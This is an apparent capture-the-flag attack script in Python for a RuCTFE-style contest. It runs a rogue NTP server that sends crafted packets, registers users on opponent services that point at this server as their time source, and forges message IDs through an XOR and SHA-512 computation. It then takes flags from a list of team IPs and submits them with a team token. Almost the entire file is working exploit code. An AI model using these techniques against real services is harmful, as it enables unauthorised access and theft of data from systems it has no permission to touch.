import requests
import json
import struct

from binascii import unhexlify
import hashlib

import datetime
import socket
import struct
import time
import Queue
import mutex
import threading
import select
import sys

taskQueue = Queue.Queue()
stopFlag = False
timeToSend = 0x00

def system_to_ntp_time(timestamp):
    """Convert a system time to a NTP time.

    Parameters:
    timestamp -- timestamp in system time

    Returns:
    corresponding NTP time
    """
    return timestamp + NTP.NTP_DELTA

def _to_int(timestamp):
    """Return the integral part of a timestamp.

    Parameters:
    timestamp -- NTP timestamp

    Retuns:
    integral part
    """
    return int(timestamp)

def _to_frac(timestamp, n=32):
    """Return the fractional part of a timestamp.

    Parameters:
    timestamp -- NTP timestamp
    n         -- number of bits of the fractional part

    Retuns:
    fractional part
    """
    return int(abs(timestamp - _to_int(timestamp)) * 2**n)

def _to_time(integ, frac, n=32):
    """Return a timestamp from an integral and fractional part.

    Parameters:
    integ -- integral part
    frac  -- fractional part
    n     -- number of bits of the fractional part

    Retuns:
    timestamp
    """
    return integ + float(frac)/2**n 
        


class NTPException(Exception):
    """Exception raised by this module."""
    pass


class NTP:
    """Helper class defining constants."""

    _SYSTEM_EPOCH = datetime.date(*time.gmtime(0)[0:3])
    """system epoch"""
    _NTP_EPOCH = datetime.date(1900, 1, 1)
    """NTP epoch"""
    NTP_DELTA = (_SYSTEM_EPOCH - _NTP_EPOCH).days * 24 * 3600
    """delta between system and NTP time"""

    REF_ID_TABLE = {
            'DNC': "DNC routing protocol",
            'NIST': "NIST public modem",
            'TSP': "TSP time protocol",
            'DTS': "Digital Time Service",
            'ATOM': "Atomic clock (calibrated)",
            'VLF': "VLF radio (OMEGA, etc)",
            'callsign': "Generic radio",
            'LORC': "LORAN-C radionavidation",
            'GOES': "GOES UHF environment satellite",
            'GPS': "GPS UHF satellite positioning",
    }
    """reference identifier table"""

    STRATUM_TABLE = {
        0: "unspecified",
        1: "primary reference",
    }
    """stratum table"""

    MODE_TABLE = {
        0: "unspecified",
        1: "symmetric active",
        2: "symmetric passive",
        3: "client",
        4: "server",
        5: "broadcast",
        6: "reserved for NTP control messages",
        7: "reserved for private use",
    }
    """mode table"""

    LEAP_TABLE = {
        0: "no warning",
        1: "last minute has 61 seconds",
        2: "last minute has 59 seconds",
        3: "alarm condition (clock not synchronized)",
    }
    """leap indicator table"""

class NTPPacket:
    """NTP packet class.

    This represents an NTP packet.
    """
    
    _PACKET_FORMAT = "!B B B b 11I"
    """packet format to pack/unpack"""

    def __init__(self, version=2, mode=3, tx_timestamp=0):
        """Constructor.

        Parameters:
        version      -- NTP version
        mode         -- packet mode (client, server)
        tx_timestamp -- packet transmit timestamp
        """
        self.leap = 0
        """leap second indicator"""
        self.version = version
        """version"""
        self.mode = mode
        """mode"""
        self.stratum = 0
        """stratum"""
        self.poll = 0
        """poll interval"""
        self.precision = 0
        """precision"""
        self.root_delay = 0
        """root delay"""
        self.root_dispersion = 0
        """root dispersion"""
        self.ref_id = 0
        """reference clock identifier"""
        self.ref_timestamp = 0
        """reference timestamp"""
        self.orig_timestamp = 0
        self.orig_timestamp_high = 0
        self.orig_timestamp_low = 0
        """originate timestamp"""
        self.recv_timestamp = 0
        """receive timestamp"""
        self.tx_timestamp = tx_timestamp
        self.tx_timestamp_high = 0
        self.tx_timestamp_low = 0
        """tansmit timestamp"""
        
    def to_data(self):
        """Convert this NTPPacket to a buffer that can be sent over a socket.

        Returns:
        buffer representing this packet

        Raises:
        NTPException -- in case of invalid field
        """
        try:
            packed = struct.pack(NTPPacket._PACKET_FORMAT,
                (self.leap << 6 | self.version << 3 | self.mode),
                self.stratum,
                self.poll,
                self.precision,
                _to_int(self.root_delay) << 16 | _to_frac(self.root_delay, 16),
                _to_int(self.root_dispersion) << 16 |
                _to_frac(self.root_dispersion, 16),
                self.ref_id,
                _to_int(self.ref_timestamp),
                _to_frac(self.ref_timestamp),
                #Change by lichen, avoid loss of precision
                self.orig_timestamp_high,
                self.orig_timestamp_low,
                _to_int(self.recv_timestamp),
                _to_frac(self.recv_timestamp),
                _to_int(self.tx_timestamp),
                _to_frac(self.tx_timestamp))
        except struct.error:
            raise NTPException("Invalid NTP packet fields.")
        return packed

    def from_data(self, data):
        """Populate this instance from a NTP packet payload received from
        the network.

        Parameters:
        data -- buffer payload

        Raises:
        NTPException -- in case of invalid packet format
        """
        try:
            unpacked = struct.unpack(NTPPacket._PACKET_FORMAT,
                    data[0:struct.calcsize(NTPPacket._PACKET_FORMAT)])
        except struct.error:
            raise NTPException("Invalid NTP packet.")

        self.leap = unpacked[0] >> 6 & 0x3
        self.version = unpacked[0] >> 3 & 0x7
        self.mode = unpacked[0] & 0x7
        self.stratum = unpacked[1]
        self.poll = unpacked[2]
        self.precision = unpacked[3]
        self.root_delay = float(unpacked[4])/2**16
        self.root_dispersion = float(unpacked[5])/2**16
        self.ref_id = unpacked[6]
        self.ref_timestamp = _to_time(unpacked[7], unpacked[8])
        self.orig_timestamp = _to_time(unpacked[9], unpacked[10])
        self.orig_timestamp_high = unpacked[9]
        self.orig_timestamp_low = unpacked[10]
        self.recv_timestamp = _to_time(unpacked[11], unpacked[12])
        self.tx_timestamp = _to_time(unpacked[13], unpacked[14])
        self.tx_timestamp_high = unpacked[13]
        self.tx_timestamp_low = unpacked[14]

    def GetTxTimeStamp(self):
        return (self.tx_timestamp_high,self.tx_timestamp_low)

    def SetOriginTimeStamp(self,high,low):
        self.orig_timestamp_high = high
        self.orig_timestamp_low = low
        

class RecvThread(threading.Thread):
    def __init__(self,socket):
        threading.Thread.__init__(self)
        self.socket = socket
    def run(self):
        global taskQueue,stopFlag
        while True:
            if stopFlag == True:
                print "RecvThread Ended"
                break
            rlist,wlist,elist = select.select([self.socket],[],[],1);
            if len(rlist) != 0:
                print "Received %d packets" % len(rlist)
                for tempSocket in rlist:
                    try:
                        data,addr = tempSocket.recvfrom(1024)
                        recvTimestamp = recvTimestamp = system_to_ntp_time(time.time())
                        taskQueue.put((data,addr,recvTimestamp))
                    except socket.error,msg:
                        print msg;

class WorkThread(threading.Thread):
    def __init__(self,socket):
        threading.Thread.__init__(self)
        self.socket = socket
    def run(self):
        global taskQueue,stopFlag
        while True:
            if stopFlag == True:
                print "WorkThread Ended"
                break
            try:
                data,addr,recvTimestamp = taskQueue.get(timeout=1)
                recvPacket = NTPPacket()
                recvPacket.from_data(data)
                timeStamp_high,timeStamp_low = recvPacket.GetTxTimeStamp()
                sendPacket = NTPPacket(version=3,mode=4)
                sendPacket.stratum = 2
                sendPacket.poll = 10
                '''
                sendPacket.precision = 0xfa
                sendPacket.root_delay = 0x0bfa
                sendPacket.root_dispersion = 0x0aa7
                sendPacket.ref_id = 0x808a8c2c
                '''
                sendPacket.ref_timestamp = recvTimestamp-5
                sendPacket.SetOriginTimeStamp(timeStamp_high,timeStamp_low)
                sendPacket.recv_timestamp = 0x00 
                sendPacket.tx_timestamp = timeToSend #system_to_ntp_time(time.time())
                data = "\x41"*40
                packed = struct.pack("<Q", (timeToSend))
                data += packed


                #socket.sendto(sendPacket.to_data(),addr)
                socket.sendto(data,addr)

                print "Sended to %s:%d" % (addr[0],addr[1])
                print "Sended time: " + str(sendPacket.tx_timestamp)
            except Queue.Empty:
                continue
                


def long_to_bytes (val, endianness='big'):
    """
    Use :ref:`string formatting` and :func:`~binascii.unhexlify` to
    convert ``val``, a :func:`long`, to a byte :func:`str`.

    :param long val: The value to pack

    :param str endianness: The endianness of the result. ``'big'`` for
      big-endian, ``'little'`` for little-endian.

    If you want byte- and word-ordering to differ, you're on your own.

    Using :ref:`string formatting` lets us use Python's C innards.
    """

    # one (1) hex digit per four (4) bits
    width = val.bit_length()

    # unhexlify wants an even multiple of eight (8) bits, but we don't
    # want more digits than we need (hence the ternary-ish 'or')
    width += 8 - ((width % 8) or 8)

    # format width specifier: four (4) bits per hex digit
    fmt = '%%0%dx' % (width // 4)

    # prepend zero (0) to the width, to zero-pad the output
    s = unhexlify(fmt % val)

    if endianness == 'little':
        # see http://stackoverflow.com/a/931095/309233
        s = s[::-1]

    return s

listenIp = "0.0.0.0"
listenPort = 44445
socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
socket.bind((listenIp,listenPort))
print "local socket: ", socket.getsockname();
recvThread = RecvThread(socket)
recvThread.start()
workThread = WorkThread(socket)
workThread.start()

timeToSend = 0x00

ips = ["10.60.102.2", "10.60.2.2", "10.60.4.2", "10.60.5.2", "10.60.7.2", "10.60.10.2", "10.60.11.2", "10.60.12.2", "10.60.14.2", "10.60.18.2", "10.60.20.2", "10.60.21.2", "10.60.23.2", "10.60.24.2", "10.60.25.2", "10.60.28.2", "10.60.29.2", "10.60.31.2", "10.60.33.2", "10.60.34.2", "10.60.37.2", "10.60.40.2", "10.60.41.2", "10.60.42.2", "10.60.43.2", "10.60.44.2", "10.60.46.2", "10.60.47.2", "10.60.48.2", "10.60.49.2", "10.60.51.2", "10.60.54.2", "10.60.55.2", "10.60.56.2", "10.60.57.2", "10.60.58.2", "10.60.59.2", "10.60.61.2", "10.60.62.2", "10.60.63.2", "10.60.64.2", "10.60.65.2", "10.60.66.2", "10.60.67.2", "10.60.71.2", "10.60.72.2", "10.60.74.2", "10.60.81.2", "10.60.82.2", "10.60.85.2", "10.60.86.2", "10.60.87.2", "10.60.91.2", "10.60.95.2", "10.60.98.2", "10.60.99.2", "10.60.100.2", "10.60.103.2", "10.60.105.2", "10.60.107.2", "10.60.108.2", "10.60.109.2", "10.60.110.2", "10.60.113.2", "10.60.114.2", "10.60.115.2", "10.60.118.2", "10.60.119.2", "10.60.123.2", "10.60.126.2", "10.60.129.2", "10.60.130.2", "10.60.133.2", "10.60.141.2", "10.60.144.2", "10.60.145.2", "10.60.146.2", "10.60.147.2", "10.60.148.2", "10.60.149.2", "10.60.150.2", "10.60.151.2", "10.60.152.2", "10.60.157.2", "10.60.158.2", "10.60.160.2", "10.60.162.2", "10.60.163.2", "10.60.164.2", "10.60.165.2", "10.60.168.2", "10.60.169.2", "10.60.170.2", "10.60.171.2", "10.60.172.2", "10.60.178.2", "10.60.180.2", "10.60.182.2", "10.60.183.2", "10.60.185.2", "10.60.195.2", "10.60.200.2", "10.60.204.2", "10.60.207.2", "10.60.214.2", "10.60.216.2", "10.60.220.2", "10.60.221.2", "10.60.222.2", "10.60.225.2", "10.60.226.2", "10.60.228.2", "10.60.236.2", "10.60.237.2", "10.60.238.2", "10.60.241.2", "10.60.243.2", "10.60.250.2", "10.60.253.2", "10.61.2.2", "10.61.3.2", "10.61.5.2", "10.61.6.2", "10.61.9.2", "10.61.13.2", "10.61.19.2", "10.61.23.2", "10.61.24.2", "10.61.30.2", "10.61.37.2", "10.61.38.2", "10.61.145.2"]
servermsg = [
"If mankind perished utterly;",
"Robins will wear their feathery fire",
"Would scarcely know that we were gone.",
"And not one will know of the war, not one",
"And frogs in the pool singing at night",
"There will come soft rains and the smell of the ground",
"Hello?",
"Whistling their whims on a low fence-wire;",
"And swallows circling with their shimmering sound",
"Will care at last when it is done.",
"Not one would mind, neither bird nor tree,",
"And Spring herself when she woke at dawn",
"And wild plum trees in tremulous white;",
"test"]

for ip in ips:
    try:
        print "[+] Using IP: " + ip

        currentLastId = 0x00

        messages = json.loads(requests.get("http://" + ip + ":9999/api/board/messages", timeout=4).content)
        for curreM in messages:
            for currSM in servermsg:
                if currSM in curreM["text"]:
                    currentLastId = int(curreM["messageId"]["id"])
                    print "Found Message: " + currSM
                    print "Current Last ID: " + str(currentLastId)
                    break;
            if currentLastId != 0x00:
                break;
        if currentLastId == 0x00:
            continue
        timeToSend = 0
        time.sleep(2)
        newUser = {"FirstName":"My", "LastName":"Cool", "VaultTimeSource":{"IPAddres":"10.60.31.2", "Port":"44445"},"TrackingCode":"None"}
        newUser = json.loads(requests.post("http://" + ip + ":9999/api/board/user", json=newUser, timeout=4).content)

        time.sleep(1)

        #newUser2 = {"FirstName":"My", "LastName":"Cool", "VaultTimeSource":{"IPAddres":"10.60.31.2", "Port":"44444"},"TrackingCode":"None"}
        #newUser2 = json.loads(requests.post("http://10.60.102.2:9999/api/board/user", json=newUser2).content)

        print "UserID 1:" + str(hex(int(newUser["userId"])))
        #print "UserID 2:" + str(hex(int(newUser2["userId"])))

        oldSha = long_to_bytes(int(newUser["userId"]), endianness='little')
        oldShaLen = len(oldSha)
        newSha = oldSha + (8-oldShaLen)*"\x00"
        #print newSha
        hashResult = hashlib.sha512(newSha).digest()[0:6] + "\x00\x00"
        newUserId = struct.unpack('q', hashResult)[0]
        print "Calculated: " + str(hex(newUserId))

        toGenerate = currentLastId;
        timestamp = toGenerate ^ newUserId
        timeToSend = timestamp

        time.sleep(1)

        print "Calculated Timestamp: " + str(hex(timestamp))

        message = json.loads(requests.post("http://" + ip + ":9999/api/board/message/post/" + newUser["userId"],data="pwd", timeout=4).content)
        try:
            print "FOUND FLAG: " + message["userInfo"]["meta"]["trackingCode"]
            #if not "None" in message["userInfo"]["meta"]["trackingCode"]:
            print requests.put("http://monitor.ructfe.org/flags", headers={"X-Team-Token":"12081283-45cf-44a3-af32-40d1003d827f"}, data=[message["userInfo"]["meta"]["trackingCode"]])
        except:
            pass
        #print "Message ID real: " + str(hex(int(message["trackingCode"])))
        print message
    except:
        pass
    

while True:
       try:
               time.sleep(0.5)
       except KeyboardInterrupt:
               print "Exiting..."
               stopFlag = True
               recvThread.join()
               workThread.join()
               #socket.close()
               print "Exited"
               break







